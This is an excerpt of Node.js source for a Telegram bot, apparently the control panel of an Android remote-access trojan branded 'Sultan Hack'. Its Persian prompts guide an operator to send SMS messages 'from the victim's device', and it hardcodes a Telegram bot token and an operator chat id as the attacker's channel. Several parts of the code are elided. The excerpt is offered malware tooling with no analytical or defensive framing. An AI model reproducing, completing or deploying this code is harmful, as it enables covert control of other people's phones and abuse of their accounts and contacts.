...
const token = 
  '7287697995:AAEMFinonb47ZJf9Fri1Cp8J4Q-6VnD1t8w'
const id = '6295992883'
...
app.get('/', function (req, res) {
    res.send('<h1 align="center">ربات توسعه دهنده ربات با موفقیت راه اندازی شد:@SLTAN_HKBLVC2017 سلطان هک</h1>')
})
...
appBot.on('message', (message) => {
    ...
    if (message.reply_to_message) {
        ...
        if (message.reply_to_message.text.includes('°• خوب حالا پیامی را که می خواهید از دستگاه قربانی بفرستید به شماره ای که چند لحظه پیش نوشتید بنویسید ....')) {
            ...
            appBot.sendMessage(id,
                ...
                '• در چند لحظه آینده پاسخی از طرف سازنده دریافت خواهید کرد @SLTAN_HKBLVC2017 سلطان هک ،',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
    ...
    if (id == chatId) {
        if (message.text == '/start') {
            appBot.sendMessage(id,
                '°• به ربات توسعه دهنده هک ربات خوش آمدید @SLTAN_HKBLVC2017 سلطان هک\n\n' +
